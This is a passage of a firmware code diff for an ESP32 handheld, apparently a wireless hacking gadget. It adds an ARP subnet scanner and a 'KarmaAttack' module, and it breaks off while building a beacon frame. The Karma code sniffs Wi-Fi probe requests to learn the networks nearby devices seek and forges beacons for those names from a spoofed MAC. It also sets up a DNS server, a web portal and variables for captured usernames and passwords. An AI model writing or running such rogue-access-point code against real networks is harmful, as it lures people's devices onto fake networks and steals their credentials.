+  tft.println(page_buf);
+
+  int y = LIST_FIRST_ROW_Y;
+  const int start_index = s_currentPage * perPage;
+  const int end_index = min(start_index + perPage, count);
+  for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
+    drawRow(i, y, i == s_currentIndex);
+    y += LIST_ROW_H;
+  }
+
+  drawTabBar("Rescan", false, "Prev", s_currentIndex <= 0, "Next",
+             s_currentIndex >= count - 1);
+  s_lastRenderedIndex = s_currentIndex;
+  s_lastRenderedPage = s_currentPage;
+}
+
+static void drawScreen(bool fullRedraw) {
+  if (s_phase == Phase::ApList) {
+    drawListCommon(fullRedraw, s_apCount, "Join Network:", drawApRow);
+  } else {
+    drawListCommon(fullRedraw, s_hostCount, "ARP Hosts:", drawHostRow);
+  }
+  updateNavLabels();
+}
+
+static void scanAccessPoints() {
+  s_scanning = true;
+  s_phase = Phase::ApList;
+  s_apCount = 0;
+  s_currentIndex = 0;
+  s_currentPage = 0;
+  s_lastRenderedPage = -1;
+  displayBusyWithLoading("Scanning.", "Looking for networks.");
+  updateNavLabels();
+
+  disconnectSta();
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(true, true);
+  delay(40);
+  WiFi.scanDelete();
+
+  const uint32_t dwell = wifiStaScanMsPerChannel();
+  const int n = WiFi.scanNetworks(false, true, false, dwell);
+  if (n > 0) {
+    for (int i = 0; i < n && s_apCount < MAX_APS; i++) {
+      ApEntry& e = s_aps[s_apCount];
+      truncCopy(e.ssid, sizeof(e.ssid), WiFi.SSID(i).c_str(), 32);
+      const uint8_t* bssid = WiFi.BSSID(i);
+      if (bssid) {
+        memcpy(e.bssid, bssid, 6);
+      } else {
+        memset(e.bssid, 0, 6);
+      }
+      e.rssi = (int8_t)WiFi.RSSI(i);
+      e.channel = (uint8_t)WiFi.channel(i);
+      e.authmode = WiFi.encryptionType(i);
+      s_apCount++;
+    }
+  }
+
+  if (s_apCount > 1) {
+    qsort(s_aps, s_apCount, sizeof(ApEntry), compareApRssi);
+  }
+
+  WiFi.scanDelete();
+  s_scanning = false;
+  s_lastRenderedPage = -1;
+  drawScreen(true);
+}
+
+static bool promptPassword(String& outPass) {
+  OnScreenKeyboardConfig cfg;
+  cfg.titleLine1 = "[!] WiFi password";
+  cfg.titleLine2 = "Required to join AP for ARP scan";
+  osKeyboardUseStandardLayout(cfg);
+  cfg.maxLen = 63;
+  cfg.shuffleNames = nullptr;
+  cfg.shuffleCount = 0;
+  cfg.buttonsY = 195;
+  cfg.backLabel = "Back";
+  cfg.middleLabel = nullptr;
+  cfg.okLabel = "Join";
+  cfg.enableShuffle = false;
+  cfg.requireNonEmpty = true;
+  cfg.emptyErrorMsg = "Password required!";
+
+  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, "");
+  resetTouchNavHeldState();
+  s_uiDrawn = false;
+
+  float v = readBatteryVoltage();
+  drawStatusBar(v, true);
+  redrawTouchButtonBar();
+
+  if (!r.accepted || r.text.length() == 0) {
+    return false;
+  }
+  outPass = r.text;
+  return true;
+}
+
+static bool connectToAp(const ApEntry& ap, const char* password) {
+  displayBusyWithLoading("Connecting.", ap.ssid[0] ? ap.ssid : "(hidden)");
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(true, true);
+  delay(40);
+
+  if (ap.authmode == WIFI_AUTH_OPEN || !password || !password[0]) {
+    WiFi.begin(ap.ssid, nullptr, ap.channel, ap.bssid, true);
+  } else {
+    WiFi.begin(ap.ssid, password, ap.channel, ap.bssid, true);
+  }
+
+  const uint32_t start = millis();
+  while (WiFi.status() != WL_CONNECTED) {
+    if (feature_exit_requested || isButtonPressed(BTN_SELECT) || featureExitButtonPressed()) {
+      WiFi.disconnect(true, true);
+      return false;
+    }
+    if (millis() - start > CONNECT_TIMEOUT_MS) {
+      WiFi.disconnect(true, true);
+      return false;
+    }
+    delay(50);
+    updateStatusBar();
+  }
+  truncCopy(s_joinedSsid, sizeof(s_joinedSsid), ap.ssid, 32);
+  return true;
+}
+
+static void disconnectSta() {
+  if (WiFi.getMode() != WIFI_OFF) {
+    WiFi.disconnect(true, true);
+  }
+  s_joinedSsid[0] = '\0';
+}
+
+static bool hostAlreadyStored(uint32_t ip) {
+  for (int i = 0; i < s_hostCount; i++) {
+    if (s_hosts[i].ip == ip) {
+      return true;
+    }
+  }
+  return false;
+}
+
+static void tryStoreHost(uint32_t ipU32, const uint8_t mac[6]) {
+  if (s_hostCount >= MAX_HOSTS || hostAlreadyStored(ipU32)) {
+    return;
+  }
+  HostEntry& h = s_hosts[s_hostCount];
+  h.ip = ipU32;
+  memcpy(h.mac, mac, 6);
+  s_hostCount++;
+}
+
+static void runArpSweep() {
+  s_scanning = true;
+  s_phase = Phase::Hosts;
+  s_hostCount = 0;
+  s_currentIndex = 0;
+  s_currentPage = 0;
+  s_lastRenderedPage = -1;
+
+  if (WiFi.status() != WL_CONNECTED) {
+    s_scanning = false;
+    displayBusy("Not connected.", "Join a network first.");
+    delay(700);
+    s_phase = Phase::ApList;
+    drawScreen(true);
+    return;
+  }
+
+  displayBusy("ARP Scanning.", "Probing local subnet.");
+  updateNavLabels();
+
+  // Stable progress line under the status text (no wipe / no status-bar churn).
+  int lastProgHosts = -1;
+  auto paintHostProgress = [&]() {
+    if (s_hostCount == lastProgHosts) {
+      return;
+    }
+    lastProgHosts = s_hostCount;
+    char prog[32];
+    snprintf(prog, sizeof(prog), "Found %-3d hosts   ", s_hostCount);
+    tft.setTextSize(1);
+    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
+    tft.setCursor(10, 80);
+    tft.print(prog);
+  };
+  paintHostProgress();
+
+  struct netif* nif = staNetif();
+  if (!nif) {
+    s_scanning = false;
+    displayBusy("ARP failed.", "No network interface.");
+    delay(700);
+    drawScreen(true);
+    return;
+  }
+
+  const uint32_t localIp = (uint32_t)WiFi.localIP();
+  const uint32_t mask = (uint32_t)WiFi.subnetMask();
+  const uint32_t network = localIp & mask;
+  const uint32_t broadcast = network | (~mask);
+
+  uint32_t startHost = network + 1;
+  uint32_t endHost = (broadcast > startHost) ? (broadcast - 1) : startHost;
+  if (endHost < startHost) {
+    endHost = startHost;
+  }
+
+  // Cap sweep size for UI responsiveness on large subnets.
+  uint32_t total = endHost - startHost + 1;
+  if (total > (uint32_t)ARP_MAX_HOSTS_SWEEP) {
+    const uint32_t base = localIp & 0xFFFFFF00u;
+    startHost = base + 1;
+    endHost = base + 254;
+    if (startHost < network + 1) startHost = network + 1;
+    if (endHost > broadcast - 1) endHost = broadcast - 1;
+  }
+
+  // Always include gateway if present.
+  const uint32_t gw = (uint32_t)WiFi.gatewayIP();
+  if (gw != 0 && gw != localIp) {
+    ip4_addr_t target;
+    target.addr = gw;
+    etharp_request(nif, &target);
+    delay(ARP_BATCH_WAIT_MS);
+    struct eth_addr* eth = nullptr;
+    const ip4_addr_t* tip = nullptr;
+    if (etharp_find_addr(nif, &target, &eth, &tip) >= 0 && eth) {
+      tryStoreHost(gw, eth->addr);
+      paintHostProgress();
+    }
+  }
+
+  uint32_t batchIps[ARP_BATCH];
+  int batchCount = 0;
+  uint8_t statusTick = 0;
+
+  for (uint32_t host = startHost; host <= endHost; host++) {
+    if (feature_exit_requested) {
+      break;
+    }
+    if (host == localIp || host == broadcast || host == network) {
+      continue;
+    }
+    batchIps[batchCount++] = host;
+    if (batchCount >= ARP_BATCH) {
+      for (int i = 0; i < batchCount; i++) {
+        ip4_addr_t target;
+        target.addr = batchIps[i];
+        etharp_request(nif, &target);
+      }
+      delay(ARP_BATCH_WAIT_MS);
+      for (int i = 0; i < batchCount; i++) {
+        ip4_addr_t target;
+        target.addr = batchIps[i];
+        struct eth_addr* eth = nullptr;
+        const ip4_addr_t* tip = nullptr;
+        if (etharp_find_addr(nif, &target, &eth, &tip) >= 0 && eth) {
+          tryStoreHost(batchIps[i], eth->addr);
+        }
+      }
+      batchCount = 0;
+      paintHostProgress();
+      if ((++statusTick & 0x07) == 0) {
+        updateStatusBar();
+      }
+    }
+  }
+
+  if (batchCount > 0) {
+    for (int i = 0; i < batchCount; i++) {
+      ip4_addr_t target;
+      target.addr = batchIps[i];
+      etharp_request(nif, &target);
+    }
+    delay(ARP_BATCH_WAIT_MS);
+    for (int i = 0; i < batchCount; i++) {
+      ip4_addr_t target;
+      target.addr = batchIps[i];
+      struct eth_addr* eth = nullptr;
+      const ip4_addr_t* tip = nullptr;
+      if (etharp_find_addr(nif, &target, &eth, &tip) >= 0 && eth) {
+        tryStoreHost(batchIps[i], eth->addr);
+      }
+    }
+    paintHostProgress();
+  }
+
+  // Also record ourselves.
+  {
+    uint8_t mac[6];
+    WiFi.macAddress(mac);
+    tryStoreHost(localIp, mac);
+  }
+
+  if (s_hostCount > 1) {
+    qsort(s_hosts, s_hostCount, sizeof(HostEntry), compareHostIp);
+  }
+
+  s_scanning = false;
+  s_lastRenderedPage = -1;
+  drawScreen(true);
+}
+
+static void joinSelectedAp() {
+  if (s_phase != Phase::ApList || s_apCount <= 0) {
+    return;
+  }
+  if (s_currentIndex < 0 || s_currentIndex >= s_apCount) {
+    return;
+  }
+
+  const ApEntry& ap = s_aps[s_currentIndex];
+  String password;
+
+  if (ap.authmode != WIFI_AUTH_OPEN) {
+    if (!promptPassword(password)) {
+      drawScreen(true);
+      return;
+    }
+  }
+
+  if (!connectToAp(ap, password.c_str())) {
+    displayBusy("Join failed.", "Check password / signal.");
+    delay(900);
+    s_phase = Phase::ApList;
+    drawScreen(true);
+    return;
+  }
+
+  runArpSweep();
+}
+
+static void handleNavButtons() {
+  const unsigned long now = millis();
+  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
+    (void)isButtonPressedEdge(BTN_LEFT);
+    (void)isButtonPressedEdge(BTN_RIGHT);
+    (void)isButtonPressedEdge(BTN_UP);
+    (void)isButtonPressedEdge(BTN_DOWN);
+    return;
+  }
+
+  if (s_scanning) {
+    return;
+  }
+
+  const int count = (s_phase == Phase::ApList) ? s_apCount : s_hostCount;
+
+  if (isButtonPressedEdge(BTN_LEFT)) {
+    if (s_phase == Phase::ApList) {
+      scanAccessPoints();
+    } else {
+      runArpSweep();
+    }
+    s_lastBtnMs = now;
+    return;
+  }
+
+  if (isButtonPressedEdge(BTN_RIGHT)) {
+    if (s_phase == Phase::ApList) {
+      joinSelectedAp();
+    } else {
+      disconnectSta();
+      s_phase = Phase::ApList;
+      s_hostCount = 0;
+      s_currentIndex = 0;
+      s_currentPage = 0;
+      s_lastRenderedPage = -1;
+      drawScreen(true);
+    }
+    s_lastBtnMs = now;
+    return;
+  }
+
+  if (isButtonPressedEdge(BTN_DOWN)) {
+    if (count > 0) {
+      s_currentIndex = (s_currentIndex + 1) % count;
+      drawScreen(false);
+    }
+    s_lastBtnMs = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_UP)) {
+    if (count > 0) {
+      s_currentIndex = (s_currentIndex - 1 + count) % count;
+      drawScreen(false);
+    }
+    s_lastBtnMs = now;
+    return;
+  }
+}
+
+static void handleTouch() {
+  int x, y;
+  if (!feature_active || !readTouchXY(x, y)) {
+    return;
+  }
+  if (s_scanning) {
+    return;
+  }
+
+  const int count = (s_phase == Phase::ApList) ? s_apCount : s_hostCount;
+  const int perPage = networksPerPage();
+  if (y >= LIST_FIRST_ROW_Y && y < wifiListBottomY() && count > 0) {
+    const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
+    const int idx = s_currentPage * perPage + row;
+    if (row >= 0 && row < perPage && idx < count) {
+      s_currentIndex = idx;
+      drawScreen(false);
+      delay(120);
+      if (s_phase == Phase::ApList) {
+        joinSelectedAp();
+      }
+    }
+  }
+}
+
+static void runUI() {
+  static int iconX[ICON_NUM] = {220, 10};
+  static int iconY = STATUS_BAR_Y_OFFSET;
+  static const unsigned char* icons[ICON_NUM] = {
+      bitmap_icon_undo,
+      bitmap_icon_go_back};
+
+  if (!s_uiDrawn) {
+    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
+    for (int i = 0; i < ICON_NUM; i++) {
+      if (icons[i] != NULL) {
+        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+      }
+    }
+    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
+    s_uiDrawn = true;
+  }
+
+  static unsigned long lastAnimationTime = 0;
+  static int animationState = 0;
+  static int activeIcon = -1;
+
+  switch (animationState) {
+    case 0:
+      break;
+    case 1:
+      if (millis() - lastAnimationTime >= 150) {
+        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+        animationState = 2;
+        lastAnimationTime = millis();
+      }
+      break;
+    case 2:
+      if (millis() - lastAnimationTime >= 200) {
+        animationState = 3;
+        lastAnimationTime = millis();
+      }
+      break;
+    case 3:
+      if (activeIcon == 0) {
+        if (s_phase == Phase::ApList) {
+          scanAccessPoints();
+        } else {
+          runArpSweep();
+        }
+      }
+      animationState = 0;
+      activeIcon = -1;
+      break;
+  }
+
+  static unsigned long lastTouchCheck = 0;
+  if (millis() - lastTouchCheck >= 50) {
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
+      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
+        for (int i = 0; i < ICON_NUM; i++) {
+          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
+            if (icons[i] != NULL && animationState == 0) {
+              if (i == 1) {
+                feature_exit_requested = true;
+              } else {
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
+            }
+            break;
+          }
+        }
+      }
+    }
+    lastTouchCheck = millis();
+  }
+}
+
+static void teardown() {
+  disconnectSta();
+  WiFi.scanDelete();
+  s_scanning = false;
+}
+
+void arpScannerSetup() {
+  pauseBackgroundRadioTasks();
+  setTouchButtonInputEnabled(true);
+  featureClearContent(TFT_BLACK);
+
+  setupTouchscreen();
+  s_uiDrawn = false;
+  s_phase = Phase::ApList;
+  s_apCount = 0;
+  s_hostCount = 0;
+  s_currentIndex = 0;
+  s_currentPage = 0;
+  s_scanning = false;
+  s_lastRenderedIndex = -1;
+  s_lastRenderedPage = -1;
+  s_joinedSsid[0] = '\0';
+
+  float v = readBatteryVoltage();
+  drawStatusBar(v, true);
+  redrawTouchButtonBar();
+  runUI();
+  updateNavLabels();
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  scanAccessPoints();
+}
+
+void arpScannerLoop() {
+  if (feature_exit_requested) {
+    teardown();
+    return;
+  }
+  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+    teardown();
+    feature_exit_requested = true;
+    return;
+  }
+
+  handleNavButtons();
+  handleTouch();
+  updateStatusBar();
+  runUI();
+  maintainTouchNavBar();
+
+  if (feature_exit_requested) {
+    teardown();
+  }
+}
+
+}  // namespace ArpScanner
+
+
+namespace KarmaAttack {
+
+#define SCREEN_WIDTH 240
+#define STATUS_BAR_Y_OFFSET 20
+#define STATUS_BAR_HEIGHT 16
+#define ICON_SIZE 16
+#define ICON_NUM 2
+#define LINE_HEIGHT 12
+
+static constexpr int TERM_CAPACITY = 24;
+static constexpr int CARDS_Y = 42;
+static constexpr int CARD_H = 34;
+static constexpr int CARD_W = 70;
+static constexpr int CARD_GAP = 7;
+static constexpr int CARD_MARGIN = 8;
+static constexpr int INFO_ROW_H = 16;
+static constexpr int AP_Y = 82;
+static constexpr int TOP_Y = 98;
+static constexpr int BAR_ZONE_W = 30;
+static constexpr int ACT_LABEL_Y = 118;
+static constexpr int TERM_TOP_Y = 134;
+static constexpr int MAX_PROBE_SSIDS = 32;
+static constexpr unsigned long HOP_MS = 800;
+static constexpr unsigned long AP_SWITCH_MS = 2500;
+static constexpr unsigned long BEACON_GAP_MS = 15;
+static constexpr unsigned long BTN_DEBOUNCE_MS = 200;
+static constexpr unsigned long STATS_MS = 1000;
+static constexpr uint16_t DNS_PORT = 53;
+static constexpr const char* kTestSsids[] = {"TestKarma", "FreeWiFi", "HomeWiFi", "ESP32-DIV"};
+static constexpr int kTestSsidCount = 4;
+
+struct ProbeSsid {
+  char ssid[33];
+  uint16_t hits;
+  int8_t rssi;
+  uint8_t channel;
+  uint32_t lastSeenMs;
+};
+
+static ProbeSsid s_list[MAX_PROBE_SSIDS];
+static int s_count = 0;
+
+static bool s_running = false;
+static bool s_uiDrawn = false;
+static bool s_headerDirty = true;
+static bool s_portalUp = false;
+static unsigned long s_lastBtnMs = 0;
+static unsigned long s_lastHopMs = 0;
+static unsigned long s_lastApSwitchMs = 0;
+static unsigned long s_lastBeaconMs = 0;
+static unsigned long s_lastStatsMs = 0;
+static uint8_t s_channel = 6;
+static uint8_t s_beaconIdx = 0;
+static int s_activeApIndex = -1;
+static uint32_t s_probeFrames = 0;
+static uint32_t s_namedProbes = 0;
+static uint32_t s_beaconsSent = 0;
+static uint32_t s_beaconRate = 0;
+static uint32_t s_beaconsAtMark = 0;
+static unsigned long s_rateMarkMs = 0;
+static uint8_t s_lastClients = 0;
+
+static char s_apSsid[33] = "";
+static char s_lastUser[32] = "";
+static char s_lastPass[32] = "";
+static uint16_t s_credCount = 0;
+
+static String s_term[TERM_CAPACITY];
+static uint16_t s_termColor[TERM_CAPACITY];
+static int s_termLines = 0;
+
+static DNSServer s_dns;
+static WebServer s_server(80);
+static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;
+static volatile bool s_logPending = false;
+static char s_pendingLog[48];
+static uint16_t s_pendingLogColor = UI_TEXT;
+
+static uint8_t s_beaconFrame[128];
+static uint8_t s_srcMac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
+
+static char s_hdrCacheAp[52] = "";
+static char s_hdrCacheTop[52] = "";
+static char s_cardCache[3][10] = {"", "", ""};
+static uint16_t s_cardColor[3] = {0, 0, 0};
+static int s_barsCache = -2;
+static bool s_navDrawnRunning = false;
+static bool s_navDrawn = false;
+static bool s_chromeDrawn = false;
+
+static void runUI();
+static void drawDashboard(bool full);
+static void updateHeader(bool force = false);
+static void updateNavLabels(bool force = false);
+static void logLine(const String& text, uint16_t color);
+static void flushPendingLog();
+static void startKarma();
+static void stopKarma();
+static void clearLearned();
+static void promptAddSsid();
+static void ensurePortal();
+static void stopPortal();
+static void maybeSwitchAp();
+static void sendNextBeacon();
+static void hopIfNeeded();
+static void paintTextLine(int y, int x, int w, char* cache, size_t cacheSz, const char* text, uint16_t color);
+static void invalidateHeaderCache();
+static void tickBeaconRate();
+static void truncSsid(char* out, size_t n, const char* ssid, size_t maxChars);
+static bool bestSsidSnapshot(ProbeSsid& out);
+static int cardX(int i);
+static void drawStatCardsChrome();
+static void paintStatCardValue(int i, const char* value, uint16_t color);
+static int rssiBars(int8_t rssi);
+static void drawSignalBars(int x, int baseY, int bars);
+static bool paintTextLineEx(int y, int x, int w, char* cache, size_t cacheSz, const char* text, uint16_t color);
+static bool paintInfoRow(int y, char* cache, size_t cacheSz, const char* text, uint16_t color,
+                         int textMaxW);
+
+static int termVisibleLines() {
+  return min(TERM_CAPACITY, wifiMaxLinesInZone(TERM_TOP_Y, LINE_HEIGHT));
+}
+
+static void invalidateHeaderCache() {
+  s_hdrCacheAp[0] = '\0';
+  s_hdrCacheTop[0] = '\0';
+  s_cardCache[0][0] = '\0';
+  s_cardCache[1][0] = '\0';
+  s_cardCache[2][0] = '\0';
+  s_cardColor[0] = 0;
+  s_cardColor[1] = 0;
+  s_cardColor[2] = 0;
+  s_barsCache = -2;
+}
+
+static int cardX(int i) {
+  return CARD_MARGIN + i * (CARD_W + CARD_GAP);
+}
+
+static void drawStatCardsChrome() {
+  static const char* kLabels[3] = {"SSIDS", "TX/S", "CLIENTS"};
+  tft.setTextDatum(MC_DATUM);
+  tft.setTextFont(1);
+  for (int i = 0; i < 3; i++) {
+    const int x = cardX(i);
+    tft.fillRoundRect(x, CARDS_Y, CARD_W, CARD_H, 4, UI_FG);
+    tft.drawRoundRect(x, CARDS_Y, CARD_W, CARD_H, 4, UI_LINE);
+    tft.setTextColor(UI_DIM_TEXT, UI_FG);
+    tft.drawString(kLabels[i], x + CARD_W / 2, CARDS_Y + 8);
+  }
+  tft.setTextDatum(TL_DATUM);
+}
+
+static void paintStatCardValue(int i, const char* value, uint16_t color) {
+  if (i < 0 || i > 2 || !value) {
+    return;
+  }
+  if (strcmp(s_cardCache[i], value) == 0 && s_cardColor[i] == color) {
+    return;
+  }
+  const int x = cardX(i);
+  tft.fillRect(x + 2, CARDS_Y + 16, CARD_W - 4, CARD_H - 18, UI_FG);
+  tft.setTextDatum(MC_DATUM);
+  tft.setTextFont(2);
+  tft.setTextColor(color, UI_FG);
+  tft.drawString(value, x + CARD_W / 2, CARDS_Y + 24);
+  tft.setTextDatum(TL_DATUM);
+  tft.setTextFont(1);
+  strncpy(s_cardCache[i], value, sizeof(s_cardCache[i]) - 1);
+  s_cardCache[i][sizeof(s_cardCache[i]) - 1] = '\0';
+  s_cardColor[i] = color;
+}
+
+static int rssiBars(int8_t rssi) {
+  if (rssi >= -55) return 4;
+  if (rssi >= -67) return 3;
+  if (rssi >= -78) return 2;
+  if (rssi >= -88) return 1;
+  return 0;
+}
+
+static void drawSignalBars(int x, int baseY, int bars) {
+  for (int i = 0; i < 4; i++) {
+    const int h = 3 + i * 2;
+    const int bx = x + i * 5;
+    const int by = baseY - h;
+    const uint16_t c = (i < bars) ? ORANGE : UI_LINE;
+    tft.fillRect(bx, by, 3, h, c);
+  }
+}
+
+static void truncSsid(char* out, size_t n, const char* ssid, size_t maxChars) {
+  if (!out || n == 0) {
+    return;
+  }
+  if (!ssid) {
+    out[0] = '\0';
+    return;
+  }
+  const size_t len = strlen(ssid);
+  if (len <= maxChars || maxChars < 2 || n < 2) {
+    strncpy(out, ssid, n - 1);
+    out[n - 1] = '\0';
+    return;
+  }
+  const size_t keep = maxChars - 1;
+  if (keep >= n) {
+    strncpy(out, ssid, n - 1);
+    out[n - 1] = '\0';
+    return;
+  }
+  memcpy(out, ssid, keep);
+  out[keep] = '~';
+  out[keep + 1] = '\0';
+}
+
+static void tickBeaconRate() {
+  const unsigned long now = millis();
+  if (s_rateMarkMs == 0) {
+    s_rateMarkMs = now;
+    s_beaconsAtMark = s_beaconsSent;
+    s_beaconRate = 0;
+    return;
+  }
+  if (now - s_rateMarkMs < 1000) {
+    return;
+  }
+  s_beaconRate = s_beaconsSent - s_beaconsAtMark;
+  s_beaconsAtMark = s_beaconsSent;
+  s_rateMarkMs = now;
+}
+
+static bool bestSsidSnapshot(ProbeSsid& out) {
+  bool ok = false;
+  portENTER_CRITICAL(&s_mux);
+  if (s_count > 0) {
+    int best = 0;
+    for (int i = 1; i < s_count; i++) {
+      if (s_list[i].hits > s_list[best].hits) {
+        best = i;
+      } else if (s_list[i].hits == s_list[best].hits &&
+                 s_list[i].lastSeenMs > s_list[best].lastSeenMs) {
+        best = i;
+      }
+    }
+    out = s_list[best];
+    ok = true;
+  }
+  portEXIT_CRITICAL(&s_mux);
+  return ok;
+}
+
+static bool paintTextLineEx(int y, int x, int w, char* cache, size_t cacheSz, const char* text, uint16_t color) {
+  if (!text) {
+    text = "";
+  }
+  if (cache && strcmp(cache, text) == 0) {
+    return false;
+  }
+
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  const int oldW = (cache && cache[0]) ? tft.textWidth(cache) : 0;
+  const int newW = text[0] ? tft.textWidth(text) : 0;
+  int clearW = oldW > newW ? oldW : newW;
+  clearW += 4;
+  if (clearW > w) {
+    clearW = w;
+  }
+  if (clearW < 1) {
+    clearW = 1;
+  }
+
+  tft.fillRect(x, y, clearW, LINE_HEIGHT, TFT_BLACK);
+  tft.setTextColor(color, TFT_BLACK);
+  tft.setCursor(x, y);
+  tft.print(text);
+  if (cache && cacheSz > 0) {
+    strncpy(cache, text, cacheSz - 1);
+    cache[cacheSz - 1] = '\0';
+  }
+  return true;
+}
+
+// Full-width row clear so AP / Top never ghost or overlay each other.
+static bool paintInfoRow(int y, char* cache, size_t cacheSz, const char* text, uint16_t color,
+                         int textMaxW) {
+  if (!text) {
+    text = "";
+  }
+  if (cache && strcmp(cache, text) == 0) {
+    return false;
+  }
+
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  tft.fillRect(0, y, SCREEN_WIDTH, INFO_ROW_H, TFT_BLACK);
+  tft.setTextColor(color, TFT_BLACK);
+  tft.setCursor(CARD_MARGIN, y + 3);
+  tft.print(text);
+  (void)textMaxW;
+  if (cache && cacheSz > 0) {
+    strncpy(cache, text, cacheSz - 1);
+    cache[cacheSz - 1] = '\0';
+  }
+  return true;
+}
+
+static void paintTextLine(int y, int x, int w, char* cache, size_t cacheSz, const char* text, uint16_t color) {
+  (void)paintTextLineEx(y, x, w, cache, cacheSz, text, color);
+}
+
+static void updateNavLabels(bool force) {
+  if (!featureHasTouchNavBar()) {
+    return;
+  }
+  if (!force && s_navDrawn && s_navDrawnRunning == s_running) {
+    return;
+  }
+  s_navDrawnRunning = s_running;
+  s_navDrawn = true;
+  setTouchNavLabels(s_running ? "Stop" : "Start", "Clear", "Exit", "Add", nullptr);
+  redrawTouchButtonBar();
+}
+
+static bool parseSsidIe(const uint8_t* ie, int ieLen, char* out, size_t outSz) {
+  if (!ie || ieLen < 2 || !out || outSz < 2) {
+    return false;
+  }
+  int off = 0;
+  while (off + 2 <= ieLen) {
+    const uint8_t id = ie[off];
+    const uint8_t len = ie[off + 1];
+    if (off + 2 + len > ieLen) {
+      break;
+    }
+    if (id == 0) {
+      if (len == 0 || len > 32) {
+        return false;
+      }
+      bool allZero = true;
+      for (uint8_t i = 0; i < len; i++) {
+        if (ie[off + 2 + i] != 0) {
+          allZero = false;
+          break;
+        }
+      }
+      if (allZero) {
+        return false;
+      }
+      const size_t n = min((size_t)len, outSz - 1);
+      memcpy(out, &ie[off + 2], n);
+      out[n] = '\0';
+      return true;
+    }
+    off += 2 + len;
+  }
+  return false;
+}
+
+static void queueLogFromIsr(const char* text, uint16_t color) {
+  strncpy(s_pendingLog, text, sizeof(s_pendingLog) - 1);
+  s_pendingLog[sizeof(s_pendingLog) - 1] = '\0';
+  s_pendingLogColor = color;
+  s_logPending = true;
+}
+
+static int findSsidIndex(const char* ssid) {
+  for (int i = 0; i < s_count; i++) {
+    if (strcmp(s_list[i].ssid, ssid) == 0) {
+      return i;
+    }
+  }
+  return -1;
+}
+
+static int hottestIndex() {
+  if (s_count <= 0) {
+    return -1;
+  }
+  int best = 0;
+  for (int i = 1; i < s_count; i++) {
+    if (s_list[i].hits > s_list[best].hits) {
+      best = i;
+    } else if (s_list[i].hits == s_list[best].hits &&
+               s_list[i].lastSeenMs > s_list[best].lastSeenMs) {
+      best = i;
+    }
+  }
+  return best;
+}
+
+static void recordProbeSsid(const char* ssid, int8_t rssi, uint8_t channel) {
+  if (!ssid || !ssid[0]) {
+    return;
+  }
+
+  bool isNew = false;
+  portENTER_CRITICAL(&s_mux);
+  int found = findSsidIndex(ssid);
+  if (found >= 0) {
+    if (s_list[found].hits < 0xFFFF) {
+      s_list[found].hits++;
+    }
+    s_list[found].rssi = rssi;
+    s_list[found].lastSeenMs = millis();
+    if (channel >= 1 && channel <= 14) {
+      s_list[found].channel = channel;
+    }
+  } else if (s_count < MAX_PROBE_SSIDS) {
+    ProbeSsid& e = s_list[s_count];
+    strncpy(e.ssid, ssid, sizeof(e.ssid) - 1);
+    e.ssid[sizeof(e.ssid) - 1] = '\0';
+    e.hits = 1;
+    e.rssi = rssi;
+    e.channel = (channel >= 1 && channel <= 14) ? channel : s_channel;
+    e.lastSeenMs = millis();
+    s_count++;
+    isNew = true;
+  }
+  portEXIT_CRITICAL(&s_mux);
+
+  if (isNew) {
+    char buf[48];
+    snprintf(buf, sizeof(buf), "[+] learn %s", ssid);
+    queueLogFromIsr(buf, GREEN);
+    s_headerDirty = true;
+  }
+}
+
+static void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (!feature_active || !s_running) {
+    return;
+  }
+  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_MISC) {
+    return;
+  }
+
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  if (!pkt || !pkt->payload) {
+    return;
+  }
+
+  const uint8_t* p = pkt->payload;
+  int len = pkt->rx_ctrl.sig_len;
+  if (len < 24) {
+    return;
+  }
+  if ((p[0] & 0xFC) != 0x40) {
+    return;
+  }
+
+  s_probeFrames++;
+
+  char ssid[33];
+  bool ok = parseSsidIe(p + 24, len - 24, ssid, sizeof(ssid));
+  if (!ok && len > 28) {
+    ok = parseSsidIe(p + 24, len - 28, ssid, sizeof(ssid));
+  }
+  if (!ok) {
+    return;
+  }
+  for (const char* c = ssid; *c; ++c) {
+    if ((uint8_t)*c < 0x20 || (uint8_t)*c > 0x7E) {
+      return;
+    }
+  }
+
+  s_namedProbes++;
+  uint8_t ch = pkt->rx_ctrl.channel;
+  if (ch < 1 || ch > 14) {
+    ch = s_channel;
+  }
+  recordProbeSsid(ssid, pkt->rx_ctrl.rssi, ch);
+}
+
+static uint16_t buildBeacon(const char* ssid, uint8_t channel, uint8_t* out, uint16_t outMax) {
+  if (!ssid || !out || outMax < 64) {
+    return 0;
+  }
+  const uint8_t ssidLen = (uint8_t)min((size_t)32, strlen(ssid));
+  // 24 hdr + 12 fixed + 2+ssid + 10 rates + 3 ds
